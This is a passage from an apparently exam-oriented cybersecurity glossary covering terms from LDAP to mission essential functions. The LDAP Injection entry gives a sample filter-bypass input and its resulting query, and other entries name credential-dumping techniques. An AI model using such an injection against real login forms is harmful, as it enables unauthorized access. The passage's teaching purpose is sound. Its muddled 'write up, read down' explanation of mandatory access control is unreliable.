2. Payment Card Industry Data Security Standard (PCI DSS ) (Contractual obligation)

Telecommunications
1. Communications Assistance for Law Enforcement Act (CALEA ) (United States )

Energy
1. North American Electric Reliability Corporation (NERC) (United States, Canada, and Baja California Norte, Mexico)

Education & Children
1. Family Educational Rights and Privacy Act (FERPA) (United States)
2. Children's Internet Protection Act (CIPA) (United States)
3. Children's Online Privacy Protection Act (COPPA) (United States )

Government
1. Federal Information Security Modernization Act (FISMA) (United States )
2. Criminal Justice Information Services (CJIS ) Security Policy (United States )
3. The Government Security Classifications (GSC) (United Kingdom)

Cybersecurity regulations are legal rules and guidelines formulated by governments and regulatory bodies to safeguard digital information and systems from cyber threats. They set standards for protecting data confidentiality, integrity, and availability, particularly sensitive and personal information. Regulations cover diverse capabilities, including data protection, network and information systems security, data breach notifications, digital identity verification, and many others. Businesses, government agencies, organizations, and executives must work diligently to comply with these regulations or risk significant fines and imprisonment.

Cybersecurity regulations aim to protect consumer privacy rights, ensure the security of the financial system, uphold the stability and trustworthiness of the Internet and digital economy, and protect critical national infrastructure from cybercrime. The applicability of regulations depends on factors such as the industry the organization operates within, the types of data it handles, and the regions where it conducts business. Here are a few key examples, several of which have been previously mentioned:

1. General Data Protection Regulation (GDPR)
2. California Consumer Privacy Act (CCPA)
3. Health Insurance Portability and Accountability Act (HIPAA)
4. Federal Information Security Management Act (FISMA)
5. Network and Information Systems (NIS) Directive
6. Cybersecurity Maturity Model Certification (CMMC)
Lessons Learned Report (LLR) - An analysis of events that can provide insight into how to improve response and support processes in the future.
Level of Sophistication / Capability - A formal classification of the resources and expertise available to a threat actor. Level of sophistication/capability refers to a threat actor's ability to use advanced exploit techniques and tools. The least capable threat actor relies on commodity attack tools that are widely available. More capable actors can fashion new exploits in operating systems, applications software, and embedded control systems. At the highest level, a threat actor might use non-cyber tools such as political or military assets.
Lighting - Physical security mechanisms that ensure a site is sufficiently illuminated for employees and guests to feel safe and for camera-based surveillance systems to work well. Security lighting is enormously important in the perception that a building is safe and secure at night. Well-designed lighting helps to make people feel safe, especially in public areas or enclosed spaces, such as parking garages. Security lighting also acts as a deterrent by making intrusion more difficult and surveillance (whether by camera or guard) easier. The lighting design needs to account for overall light levels, the lighting of particular surfaces or areas (allowing cameras to perform facial recognition, for instance), and avoid areas of shadow and glare.
Lightweight Directory Access Protocol (LDAP) - Protocol used to access network directory databases, which store information about authorized users and their privileges, as well as other organizational information.
Lightweight Directory Access Protocol (LDAP) Injection - The Lightweight Directory Access Protocol (LDAP) is another example of a query language. LDAP is specifically used to read and write network directory databases. A threat actor could exploit either unauthenticated access or a vulnerability in a client app to submit arbitrary LDAP queries. This could allow accounts to be created or deleted, or for the attacker to change authorizations and privileges.

LDAP filters are constructed from (name=value) attribute pairs delimited by parentheses and the logical operators AND (&) and OR (|). Adding filter parameters as unsanitized input can bypass access controls. For example, if a web form authenticates to an LDAP directory with the valid credentials Bob and Pa$$w0rd , it may construct a query such as this from the user input:

(&(username=Bob)(password=Pa$$w0rd))

Both parameters must be true for the login to be accepted. If the form input is not sanitized, a threat actor could bypass the password check by entering a valid username plus an LDAP filter string, such as bob)(&)) . This causes the password filter to be dropped for a condition that is always true:

(&(username=Bob)(&))
Linux Authentication - In Linux, local user account names are stored in /etc/passwd. When a user logs in to a local interactive shell, the password is checked against a hash stored in /etc/shadow. Interactive login over a network is typically accomplished using Secure Shell (SSH). With SSH, the user can be authenticated using cryptographic keys instead of a password.

A pluggable authentication module (PAM) is a package for enabling different authentication providers, such as smart-card log-in. The PAM framework can also be used to implement authentication to network directory services.
Linux Logs - Linux logging can be implemented differently for each distribution. Some distributions use syslog to direct messages relating to a particular subsystem to a flat text file. Other distributions use Journald as a unified logging system with a binary, rather than plaintext, file format. Journald messages are read using the journalctl command, but it can be configured to export some messages to text files via syslog.

Some of the principal log files are as follows:

1. /var/log/messages or /var/log/syslog stores all events generated by the system. Some of these are copied to individual log files.

2. /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RedHat/CentOS/Fedora) records login attempts, use of sudo privileges, and other authentication and authorization data. Additionally, the faillog specifically tracks failed login events. Some distros use wtmp, utmp, and btmp files for use with commands such as w, who, and last to identify sessions and failed logins.

3. The package manager log (apt, yum, or dnf, depending on the distro) stores information about what software has been installed and updated.
Listener / Collector - A network appliance that gathers or receives log and/or state data from other network systems.
Load Balancer - Load Balancer

A type of switch, router, or software that distributes client requests between different resources, such as communications links or similarly configured servers. This provides fault tolerance and improves throughput.

A load balancer distributes client requests across available server nodes in a farm or pool. This is used to provision services that can scale from light to heavy loads and to provide mitigation against denial of service attacks. A load balancer also provides fault tolerance. If there are multiple servers available in a farm all addressed by a single name/IP address via a load balancer, then if a single server fails, client requests can be forwarded to another server in the farm. A load balancer can be deployed in any situation where there are multiple servers providing the same function. Examples include web servers, front-end email servers, web conferencing, video conferencing, and streaming media servers.

There are two main types of load balancers:

1. Layer 4 Load Balancer - Basic load balancers make forwarding decisions on IP address and TCP/UDP port values, working at the transport layer of the OSI model.

2. Layer 7 Load Balancer (content switch) - As web applications have become more complex, modern load balancers need to be able to make forwarding decisions based on application-level data, such as a request for a particular uniform resource locator (URL) web address or data types like video or audio streaming. This requires more complex logic, but the processing power of modern appliances is sufficient to deal with this.

Scheduling - The scheduling algorithm is the code and metrics that determine which node is selected for processing each incoming request. The simplest type of scheduling is called round robin; this means picking the next node. Other methods include picking the node with the fewest connections or the best response time. Each method can be weighted using administrator-set preferences or dynamic load information, or both. The load balancer must also use some type of heartbeat or health check probe to verify whether each node is available and under load or not. Layer 4 load balancers can only make basic connectivity tests while layer 7 appliances can test the application's state and verify host availability.

Source IP Affinity and Session Persistence - When a client device has established a session with a particular node in the server farm, it may be necessary to continue to use that connection for the duration of the session. Source IP or session affinity (a scheduling approach used by load balancers to route traffic to devices that have already established connections with the client in question) is a layer 4 approach to handling user sessions. It means that when a client establishes a session, it becomes stuck to the node that first accepted the request. An application-layer load balancer uses persistence (In load balancing, the configuration option that enables a client to maintain a connection with a load-balanced server over the duration of the session. Also referred to as sticky sessions) to keep a client connected to a session. Persistence typically works by setting a cookie either on the node or injected by the load balancer. This can be more reliable than source IP affinity but requires the browser to accept the cookie.
Local Network Vector - Local means that the exploit code must be executed from an authenticated session on the computer. The attack could still occur over a network, but the threat actor needs to use some valid credentials or hijack an existing session to execute it.
Log Aggregation - Parsing information from multiple log and security event data sources so that it can be presented in a consistent and searchable format.
Log Data - OS and applications software can be configured to log events automatically. This provides valuable troubleshooting information. Security logs provide an audit trail of actions performed on the system as well as warning of suspicious activity. It is important that log configuration and files be made tamperproof.

Log data is a critical resource for investigating security incidents. As well as the log format, you must also consider the range of sources for log files, and know how to determine what type of log file will best support any given investigation scenario.

Event data is generated by processes running on network appliances and general computing hosts. The process typically writes its event data to a specific log file or database. Each event is comprised of message data and metadata (Information stored or recorded as a property of an object, state of a system, or transaction):

1. Event message data is the specific notification or alert raised by the process, such as "Login failure" or "Firewall rule dropped traffic."

2. Event metadata is the source and time of the event. The source might include a host or network address, a process name, and categorization/priority fields.

Accurate logging requires each host to be synchronized to the same date and time value and format. Ideally, each host should also be configured to use the same time zone, or to use a "neutral" zone, such as universal coordinated time (UTC).

Windows hosts and applications can use Event Viewer (A Windows console related to viewing and exporting events in the Windows logging file format) format logging. Each event has a header reporting the source, level, user, timestamp, category, keywords, and host name.

Syslog (Application protocol and event-logging format enabling different appliances and software applications to transmit logs or event records to a central server. Syslog works over UDP port 514 by default) provides an open format, protocol, and server software for logging event messages. It is used by a very wide range of host types. For example, syslog messages can be generated by switches, routers, and firewalls, as well as UNIX or Linux servers and workstations.

A syslog message comprises a PRI primary code, a header, and a message part:

1. The PRI code is calculated from the facility and a severity level.

2. The header contains a timestamp, host name, app name, process ID, and message ID fields.

3. The message part contains a tag showing the source process plus content. The format of the content is application dependent. It might use space- or comma-delimited fields or name/value pairs.

Log data can be kept and analyzed on each host individually, but most organizations require better visibility into data sources and host monitoring. SIEM software can offer a "single pane of glass" view of all network hosts and appliances by collecting and aggregating logs from multiple sources. Logs can be collected via an agent running on each host, or by using syslog (or similar) to forward event data.
Logic Bomb - A malicious program or script that is set to run under particular circumstances or in response to a defined event.

Some types of malware do not trigger automatically. Having infected a system, they wait for a preconfigured time or date (time bomb) or a system or user event (logic bomb). A logic bomb isn't necessarily malicious code but could be an event that triggers an undesirable event. A typical example is a disgruntled system's administrator who leaves a scripted trap that runs in the event their account is deleted or disabled. Antivirus software is unlikely to detect this kind of malicious script or program. This type of trap is also referred to as a mine.
Logs - OS and applications software can be configured to log events automatically. This provides valuable troubleshooting information. Security logs provide an audit trail of actions performed on the system as well as warning of suspicious activity. It is important that log configuration and files be made tamperproof.
Lure-Based Vectors - Attack types that entice a victim into using or opening a removable device, document, image, or program that conceals malware. A lure is something superficially attractive or interesting that causes its target to want it, even though it may be concealing something dangerous, like a hook. In cybersecurity terms, when the target opens the file bait, it delivers a malicious payload hook that will typically give the threat actor control over the system or perform service disruption.
M of N Control - Refers to the control which requires multiple people for authentication.
MAC Filtering - Applying an access control list to a switch or access point so that only clients with approved MAC addresses can connect to it.

The network adapter in each host computer is identified by a MAC address. Configuring MAC filtering means a switch port only permits certain MAC addresses to connect. This can be done by creating a list of valid MAC addresses or by specifying a limit to the number of permitted addresses. For example, if port security is enabled with a maximum of two MAC addresses, the switch will record the first two MACs to connect to that port. The switch then drops any traffic from machines with different MAC addresses that try to connect.
macOS Logs - macOS uses a unified logging system, which can be accessed via the graphical Console app, or the log command. The log command can be used with filters to review security-related events, such as login (com.apple.login), app installs (com.apple.install), and system policy violations (com.apple.syspolicy.exec).
Maintenance Windows (Change Management) - A maintenance window is a predefined, recurring time frame for implementing changes. They are typically scheduled during periods of low activity to minimize business disruptions.
Malicious Activity Indicators - Given the range of malware types, there are many potential indicators of malicious activity. Some types of malware display obvious changes, such as adjusting browser settings or displaying ransom notices. If malware is designed to operate covertly, indicators can require detailed analysis of process, file system, and network behavior.

Sandbox Execution
If malicious activity is not detected by endpoint protection, analyze the suspect code or host in a sandboxed environment. A sandbox is a system configured to be completely isolated from the production network so that the malware cannot "break out." The sandbox will be designed to record file system and registry changes plus network activity. Similarly, a sheep dip is an isolated host used to test new software and removable media for malware indicators before it is authorized on the production network.

Resource Consumption
Abnormal resource consumption (A potential indicator of malicious activity where CPU, memory, storage, and/or network usage deviates from expected norms) can be detected using a performance monitor. Indicators such as excessive and continuous CPU usage, memory leaks, disk read/write activity, disk space usage, and network bandwidth consumption can be signs of malware. Resource consumption could be a reason to investigate a system rather than definitive proof of malicious activity. These symptoms can also be caused by many other performance and system stability issues. Also, it is only poorly written malware or malware that performs intensive operations that displays this behavior. For example, it is the nature of botnet DDoS, cryptojacking, and crypto-ransomware to hijack the computer's resources.

File System
Malicious code might not execute from a process image saved on a local disk, but it is still likely to interact with the file system and registry, revealing its presence by behavior. A computer's file system stores a great deal of useful metadata about when files were created, accessed, or modified. Analyzing these metadata and checking for suspicious temporary files can help to establish a timeline of events for an incident that has left traces on a host and its files.

Attempts to access valuable data can be revealed by blocked content (A potential indicator of malicious activity where audit logs show unauthorized attempts to read or copy a file or other data) indicators. Where files are simply protected by ACLs, if auditing is configured, an access denied message will be logged if a user account attempts to read or modify a file it does not have permission to access. Information might also be protected by a data loss prevention (DLP) system, which will also log blocked content events.

Resource Inaccessibility
Resource inaccessibility (A potential indicator of malicious activity where a file or service resource that should be available is inaccessible) means that a network, host, file, or database is not available. This is typically an indicator of a denial of service (DoS) attack. Host and network gateways might be unavailable due to excessive resource consumption. A network attack will often create large numbers of connections. Data resources might be subject to ransomware attack. Additionally, malware might disable scanning and monitoring utilities to evade detection.

Account Compromise
A threat actor will often try to exploit an existing account to achieve objectives. The following indicators can reveal suspicious account behavior:

1. Account Lockout (Policy that prevents access to an account under certain conditions, such as an excessive number of failed authentication attempts) - The system has prevented access to the account because too many failed authentication attempts have been made. Lockout could also mean that the user's password no longer works because the threat actor has changed it.

2. Concurrent Session Usage (A potential indicator of malicious activity where an account has started multiple sessions on one or more hosts) - This indicates that the threat actor has obtained the account credentials and is signed in on another workstation or over a remote access connection.

3. Impossible Travel (A potential indicator of malicious activity where authentication attempts are made from different geographical locations within a short timeframe) - This indicates that the threat actor is attempting to use remote access to sign in to an account from a geographic location that they would not have physically been able to move to in the time since their last sign in.

Logging
A threat actor will often try to cover their tracks by removing indicators from log files:

1. Missing Logs (A potential indicator of malicious activity where events or log files are deleted or tampered with) - This could mean that the log file has been deleted. As this is easy to detect, a more sophisticated threat actor will remove log entries. This might be indicated by unusual gaps between log entry times. The most sophisticated type of attack will spoof log entries to conceal the malicious activity.

2. Out-of-cycle Logging (A potential indicator of malicious activity where event dates or timestamps are not consistent) - A threat actor might also manipulate the system time or change log entry timestamps as a means of hiding activity.
Malicious Code Indicators - Many network attacks are launched by compromised hosts running various types of malicious code. Indicators of malicious code execution are either caught by endpoint protection software or discovered after the fact in logs of how the malware interacted with the network, file system, and registry. To understand how and where these indicators are generated, it is helpful to consider the main types of malicious activity:

1. Shellcode - This is a minimal program designed to exploit a vulnerability in the OS or in a legitimate app to gain privileges, or to drop a backdoor on the host if run as a Trojan. Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.

2. Credential Dumping - The malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process. Additionally, a DCSync attack attempts to trick a domain controller into replicating its user list along with their credentials with a rogue host.

3. Pivoting/ Lateral Movement / Insider Attack - The general procedure is to use the foothold to execute a process remotely, using a tool such as PsExec or PowerShell. The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.

4. Persistence - This is a mechanism that allows the threat actor's backdoor to restart if the host reboots or the user logs off. Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.
Malicious Process - A process executed without proper authorization from the system owner for the purpose of damaging or compromising the system. The malicious process remains in memory, even if the host process is terminated.
Malicious Update - A vulnerability in software repository or supply chain that a threat actor can exploit to add malicious code to a package.

A malicious update refers to an update that appears legitimate but contains harmful code, often used by cybercriminals to distribute malware or execute a cyberattack. The update may claim to fix software bugs or offer new features but is instead designed to compromise a system. The significance of such attacks lies in their deceptive nature; users trust and frequently accept software updates, making malicious updates a highly effective infiltration strategy. Malicious updates can be difficult to protect against, but secure software supply chain management, digital signature verification, and other software security practices help mitigate these risks.

In 2017, the legitimate software CCleaner was compromised when an unauthorized update was released containing a malicious payload. This affected millions of users who downloaded the update, believing it was a standard upgrade to improve their system's performance.

Another notable case is the 2020 SolarWinds attack, where attackers used an update to the SolarWinds Orion platform to distribute a malicious backdoor to numerous government and corporate networks, leading to significant data breaches.
Malware - Software that serves a malicious purpose, typically installed without the user's consent (or knowledge). Malware is simply defined as software that does something bad, from the perspective of the system owner.
Malware Classification - Many of the intrusion attempts perpetrated against computer networks depend on the use of malicious software, or malware. Malware is simply defined as software that does something bad, from the perspective of the system owner. A complicating factor with malware classification is the degree to which its installation is expected or tolerated by the user.

Some malware classifications, such as Trojan, virus, and worm, focus on the vector used by the malware. The vector is the method by which the malware executes on a computer and potentially spreads to other network hosts. The following categories describe some types of malware according to vector:

1. Viruses and Worms - Represent some of the first types of malware and spread without any authorization from the user by being concealed within the executable code of another process. These processes are described as being infected with malware.

2. Trojan - Refers to malware concealed within an installer package for software that appears to be legitimate. This type of malware does not seek any type of consent for installation and is actively designed to operate secretly.

3. Potentially unwanted programs (PUPs) /Potentially Unwanted Applications (PUAs) - Are software installed alongside a package selected by the user or perhaps bundled with a new computer system. Unlike a Trojan, the presence of a PUP is not automatically regarded as malicious. It may have been installed without active consent or with consent from a purposefully confusing license agreement. This type of software is sometimes described as grayware rather than malware. It can also be referred to as bloatware.

Other classifications are based on the payload delivered by the malware. The payload is an action performed by the malware other than simply replicating or persisting on a host. Examples of payload classifications include spyware, rootkit, remote access Trojan (RAT), and ransomware.
Managed Service Provider (MSP) - A managed service provider (MSP) provisions and supports IT resources such as networks, security, or web infrastructure. MSPs are useful when an organization finds it cheaper or more reliable to outsource all or part of IT provision rather than try to manage it directly. From a security point of view, this type of outsourcing is complex as it can be difficult to monitor the MSP. The MSP's employees are all potential sources of insider threat.
Managerial Security Control - A category of security control that gives oversight of the information system. The control gives oversight of the information system. Examples could include risk identification or a tool allowing the evaluation and selection of other security controls.
Mandatory Access Control (MAC) - An access control model where resources are protected by inflexible, system-defined rules. Resources (objects) and users (subjects) are allocated a clearance level (or label).

Mandatory access control (MAC) is based on security clearance levels. Rather than defining ACLs on resources, each object is given a classification label and each subject is granted a clearance level. In a confidentiality-oriented multilevel system, subjects are permitted to read objects classified at their own clearance level or below. For example, a user with Top Secret clearance could read data with Top Secret, Secret, and Confidential classification labels. A user with Secret clearance could access Secret and Confidential levels only.

Labeling objects and granting clearance takes place using preestablished rules. The critical point is that these rules are nondiscretionary and cannot be changed by any subject account.

As a simple classification system is inflexible, most MAC models add the concept of compartment-based access. For example, a data file might be at Secret classification and located in the HR compartment. Only subjects with Secret and HR clearance could access the file.

In MAC, users with high clearance are not permitted to write low-clearance documents. This is referred to as write up, read down. This prevents, for example, a user with Top Secret clearance republishing some Top Secret data that they can access with Secret clearance.
Maneuver - Threat Hunting - In threat hunting, the concept that threat actor and defender may use deception or counterattacking strategies to gain positional advantage.

When investigating a suspected live threat, you must remember the adversarial nature of hacking. A capable threat actor is likely to have anticipated the likelihood of threat hunting and attempted to deploy countermeasures to frustrate detection. For example, the attacker may trigger a denial of service attack to divert the security team's attention and then attempt to accelerate plans to achieve actions on objectives. Maneuver is a military doctrine term relating to obtaining positional advantage. As an example of defensive maneuver, threat hunting might use passive discovery techniques so that threat actors are given no hint that an intrusion has been discovered before the security team has a containment, eradication, and recovery plan.
Master Service Agreement (MSA) - A contract that establishes precedence and guidelines for any business documents that are executed between two parties. Outlines the overall terms and conditions of a specific contract, such as provisioning cloud resources, or ticketing/help desk support. An MSA includes scope, pricing, deliverables, and intellectual property rights.
Maximum Tolerable Downtime (MTD) - The longest period that a process can be inoperable without causing irrevocable business failure.

Maximum tolerable downtime (MTD) is the longest period of time that a business function outage may occur for without causing irrecoverable business failure. Each business process can have its own MTD, such as a range of minutes to hours for critical functions, 24 hours for urgent functions, seven days for normal functions, and so on. MTDs vary by company and event. Each function may be supported by multiple systems and assets. The MTD sets the upper limit on the amount of recovery time that system and asset owners have to resume operations. For example, an organization specializing in medical equipment may be able to exist without incoming manufacturing supplies for three months because it has stockpiled a sizable inventory. After three months, the organization will not have sufficient supplies and may not be able to manufacture additional products, therefore leading to failure. In this case, the MTD is three months.
Mean Time Between Failures (MTBF) - Metric for a device or component that predicts the expected time between failures.

Mean time between failures (MTBF) represents the expected lifetime of a product. The calculation for MTBF is the total operational time divided by the number of failures. For example, if you have 10 appliances that run for 50 hours and two of them fail, the MTBF is 250 hours/failure (10*50)/2.

A lower MTTR (Mean Time To Repair) indicates quicker restoration of functionality, reducing downtime and potential disruptions to operations. This information helps allocate resources, prioritize maintenance activities, and optimize repair processes. MTBF identifies the average time between system or equipment failures. A higher MTBF suggests greater reliability and longer intervals between failures, which can affect maintenance scheduling, spare part management, and overall system performance. Based on MTBF data, organizations can make decisions regarding maintenance strategies, equipment replacement, and investments in improving reliability.
Mean Time To Repair (MTTR) - Metric representing average time taken for a device or component to be repaired, replaced, or otherwise recover from a failure.

Mean time to repair (MTTR) is a measure of the time taken to correct a fault so that the system is restored to full operation. This can also be described as mean time to replace or recover. MTTR is calculated as the total number of hours of unplanned maintenance divided by the number of failure incidents. This average value can be used to estimate whether a recovery time objective (RTO) is achievable.

A lower MTTR indicates quicker restoration of functionality, reducing downtime and potential disruptions to operations. This information helps allocate resources, prioritize maintenance activities, and optimize repair processes. MTBF identifies the average time between system or equipment failures. A higher MTBF suggests greater reliability and longer intervals between failures, which can affect maintenance scheduling, spare part management, and overall system performance. Based on MTBF data, organizations can make decisions regarding maintenance strategies, equipment replacement, and investments in improving reliability.
Memorandum of Agreement (MOA) - Legal document forming the basis for two parties to cooperate without a formal contract (a cooperative agreement). MOAs are often used by public bodies. A formal agreement that defines the parties' specific terms, conditions, and responsibilities. MOAs establish a legally binding relationship covering objectives, roles, resources, and obligations. They provide a trustworthy framework for collaboration.
Memorandum of Understanding (MOU) - Usually a preliminary or exploratory agreement to express an intent to work together that is not legally binding and does not involve the exchange of money. A nonbinding agreement that outlines the intentions, shared goals, and general terms of cooperation between parties. MOUs serve as a preliminary step to establish a common understanding before proceeding with a more formal agreement.
Memory Dump - A file containing data captured from system memory.
Memory Injection - A vulnerability that a threat actor can exploit to run malicious code with the same privilege level as the vulnerable process.

Memory injection vulnerabilities refer to a type of security flaw where an attacker can introduce (inject) malicious code into a running application's process memory. An attacker often designs the injected code to alter an application's behavior to provide unauthorized access or control over the system. Injection vulnerabilities are significant because they often lead to severe security breaches. Attackers often use memory injection vulnerabilities to inject code that installs malware, exfiltrates sensitive data, or creates a backdoor for future access. Injected code generally runs with the same level of privileges as the compromised application, which can lead to a full system compromise if the exploited application has high-level permissions. Common memory injection attacks include buffer overflow attacks, format string vulnerabilities, and code injection attacks. These types of attacks are typically mitigated with secure coding practices such as input and output validation, encoding, type-casting, access controls, static and dynamic application testing, and several other techniques.
Message Digest Algorithm #5 (MD5) - A cryptographic hash function producing a 128-bit output. Produces a 128-bit digest. MD5 is not considered to be quite as safe for use as SHA256, but it might be required for compatibility between security products.
Metadata - Metadata (Information stored or recorded as a property of an object, state of a system, or transaction) is the properties of data as it is created by an application, stored on media, or transmitted over a network. Each logged event has metadata, but a number of other metadata sources are likely to be useful when investigating incidents. Metadata can establish timeline questions, such as when and where a breach occurred, as well as containing other types of evidence.

File
File metadata is stored as attributes. The file system tracks when a file was created, accessed, and modified. A file might be assigned a security attribute, such as marking it as read-only or as a hidden or system file. The ACL attached to a file showing its permissions represents another type of attribute. Finally, the file may have extended attributes recording an author, copyright information, or tags for indexing/searching.

As metadata is uploaded to social media sites, they can reveal more information than the uploader intended. Metadata can include current location and time, which is added to media such as photos and videos.

Web
When a client requests a resource from a web server, the server returns the resource plus headers setting or describing its properties. Also, the client can include headers in its request. One key use of headers is to transmit authorization information in the form of cookies. Headers describing the type of data returned (text or binary, for instance) can also be of interest. The contents of headers can be inspected using the standard tools built into web browsers. Header information may also be logged by a web server.

Email
An email's Internet header (A record of the email servers involved in transferring an email message from a sender to a recipient) contains address information for the recipient and sender, plus details of the servers handling transmission of the message between them. When an email is created, the mail user agent (MUA) creates an initial header and forwards the message to a mail delivery agent (MDA). The MDA should perform checks that the sender is authorized to issue messages from the domain. Assuming the email isn't being delivered locally at the same domain, the MDA adds or amends its own header and then transmits the message to a message transfer agent (MTA). The MTA routes the message to the recipient, with the message passing via one or more additional MTAs, such as SMTP servers operated by ISPs or mail security gateways. Each MTA adds information to the header.

Headers aren't exposed to the user by most email applications. You can view and copy headers from a mail client via a message properties/options/source command. MTAs can add a lot of information in each received header, such as the results of spam checking. If you use a plaintext editor to view the header, it can be difficult to identify where each part begins and ends. Fortunately, there are plenty of tools available to parse headers and display them in a more structured format. One example is the Message Analyzer tool, available as part of the Microsoft Remote Connectivity Analyzer. This will lay out the hops that the message took more clearly and break out the headers added by each MTA.
Microservices - An independent, single-function module with well-defined and lightweight interfaces and operations. Typically this style of architecture allows for rapid, frequent, and reliable delivery of complex applications.

Microservices is an architectural approach to building software applications as a collection of small and independent services focusing on a specific business capability. Each microservice is designed to be modular, with a well-defined interface and a single responsibility. This approach allows developers to build and deploy complex applications more efficiently by breaking them down into smaller, more manageable components.

Microservices also enable teams to work independently on different application features, making it easier to scale and update individual components without affecting the entire system. Overall, microservices promise to help organizations build more agile, scalable, and resilient applications that adapt quickly to changing business needs. Risks associated with this model are largely attributed to integration issues. While individual components operate well independently, they often reveal problems difficult to isolate and resolve once they are integrated.

Microservices and Infrastructure as Code (IaC) are related technologies, and Microservices architecture is often implemented using IaC practices. Using IaC, developers can define and deploy infrastructure as code, ensuring consistency and repeatability across different environments. This allows for more efficient development and deployment of microservices since developers can independently automate the provisioning and deploying infrastructure for each microservice.
Misconfiguration Vulnerabilities - Misconfiguration of systems, networks, or applications is a common cause of security vulnerabilities. These can lead to unauthorized access, data leaks, or even full-system compromises. These can occur across many areas within an IT environment from network equipment and servers to databases and applications. In a cloud environment, misconfigurations, such as improperly managed access permissions on storage buckets, can lead to significant data leaks.

Default configurations of systems, applications, or devices are often designed to prioritize ease of use, setup simplicity, and broad compatibility. However, this often results in a security trade-off, making these defaults a common source of vulnerability. For instance, default configurations may enable unnecessary services that open potential attack vectors or include easily guessable default credentials, such as "admin" for both username and password. Some systems may have overly permissive configurations that heavily focus on usability and potentially expose sensitive information if left unmodified. Network devices like routers and switches often have default configurations that compromise security, such as well-documented default credentials and the use of vulnerable management protocols.

Similarly, cloud services often have default settings that leave data storage or compute instances publicly accessible. Administrators and engineers must carefully configure systems, devices, and applications according to the principle of least privilege and published best practices. This includes changing default login credentials, tightening access controls, and regularly auditing configurations to ensure ongoing security, as a minimum.

Providing support to resolve functional issues in an IT environment is an essential part of maintaining business operations, but it can also inadvertently lead to misconfigurations and vulnerabilities. For example, while troubleshooting an issue, a support technician may temporarily disable security features or loosen access controls to help isolate a problem. If these changes are not reverted after the issue is resolved, they may leave the system vulnerable. Similarly, installing new software or modifying existing software configurations can introduce unexpected vulnerabilities or leave the system less secure. Remote support tools can also pose a risk if not adequately secured, and an attacker could exploit these tools to gain access to a system or network. When addressing urgent issues and outages, especially high-impact ones, best practices for change management are often bypassed. Changes are made without proper documentation, testing, or approval, leading to misconfigurations or system instability.
Missing Logs - A potential indicator of malicious activity where events or log files are deleted or tampered with.

This could mean that the log file has been deleted. As this is easy to detect, a more sophisticated threat actor will remove log entries. This might be indicated by unusual gaps between log entry times. The most sophisticated type of attack will spoof log entries to conceal the malicious activity.
Mission Essential Functions (MEF) - Business or organizational activity that is too critical to be deferred for anything more than a few hours, if at all.

A mission essential function (MEF) is one that cannot be deferred. This means that the organization must be able to perform the function as close to continually as possible, and if there is any service disruption, the mission essential functions must be restored first.

Functions that act as support for the business or an MEF, but are not critical in themselves, are referred to as primary business functions (PBF).

Analysis of mission essential functions is generally governed by four main metrics:

1. Maximum Tolerable Downtime (MTD) - It is the longest period of time that a business function outage may occur for without causing irrecoverable business failure. Each business process can have its own MTD, such as a range of minutes to hours for critical functions, 24 hours for urgent functions, seven days for normal functions, and so on. MTDs vary by company and event. Each function may be supported by multiple systems and assets. The MTD sets the upper limit on the amount of recovery time that system and asset owners have to resume operations. For example, an organization specializing in medical equipment may be able to exist without incoming manufacturing supplies for three months because it has stockpiled a sizable inventory. After three months, the organization will not have sufficient supplies and may not be able to manufacture additional products, therefore leading to failure. In this case, the MTD is three months.

2. Recovery time objective (RTO) - It is the period following a disaster that an individual IT system may remain offline. This represents the amount of time it takes to identify that there is a problem and then perform recovery (restore from backup or switch to an alternative system, for instance).

3. Work Recovery Time (WRT) - Following systems recovery, there may be additional work to reintegrate different systems, test overall functionality, and brief system users on any changes or different working practices so that the business function is again fully supported.
RTO+WRT must not exceed MTD!

4. Recovery point objective (RPO) - It is the amount of data loss that a system can sustain, measured in time. That is, if a database is destroyed by a virus, an RPO of 24 hours means that the data can be recovered (from a backup copy) to a point not more than 24 hours before the database was infected. RPO is determined by identifying the maximum acceptable data loss an organization can tolerate in the event of a disaster or system failure and is established by considering factors such as business requirements, data criticality, and regulatory or contractual obligations. The calculation of RPO directly impacts the frequency of data backups, data replication requirements, recovery site selection, and technologies that support failover and high availability.

For example, a customer relationship management database might be able to sustain the loss of a few hours' or days' worth of data because employees can generally remember who they have contacted and the conversations they had over this time span. Conversely, order processing is generally more time sensitive, as data losses will represent lost orders , and it may be impossible to recapture them or the related processes initiated by order processing systems, such as accounting and fulfillment data.

MTD and RPO help to determine which business functions are critical and also to specify appropriate risk countermeasures. For example, if your RPO is measured in days, then a simple tape backup system should suffice; if RPO is zero or measured in minutes or seconds, a more expensive server cluster backup and redundancy solution will be required.

Mean time to repair (MTTR) and mean time between failures (MTBF) are key performance indicators (KPIs) used to measure the reliability and efficiency of systems, processes, and equipment. Both metrics are important to risk management processes, providing measurable insights into potential risks and supporting risk mitigation strategies. MTTR and MTBF guide decisions regarding system design, maintenance practices, and redundancy or failover requirements.

1. Mean time between failures (MTBF) - It represents the expected lifetime of a product. The calculation for MTBF is the total operational time divided by the number of failures. For example, if you have 10 appliances that run for 50 hours and two of them fail, the MTBF is 250 hours/failure (10*50)/2.

2. Mean time to repair (MTTR) - It is a measure of the time taken to correct a fault so that the system is restored to full operation. This can also be described as mean time to replace or recover. MTTR is calculated as the total number of hours of unplanned maintenance divided by the number of failure incidents. This average value can be used to estimate whether a recovery time objective (RTO) is achievable.

A lower MTTR indicates quicker restoration of functionality, reducing downtime and potential disruptions to operations. This information helps allocate resources, prioritize maintenance activities, and optimize repair processes. MTBF identifies the average time between system or equipment failures. A higher MTBF suggests greater reliability and longer intervals between failures, which can affect maintenance scheduling, spare part management, and overall system performance. Based on MTBF data, organizations can make decisions regarding maintenance strategies, equipment replacement, and investments in improving reliability.
Monitoring Infrastructure - Managerial reports can be used for day-to-day monitoring of computer resources and network infrastructure. Not all issues can be identified from alerts and alarms. Running a custom report allows a manager to verify results of logging and monitoring activity to ensure that the network remains in a secure state.

Network Monitors
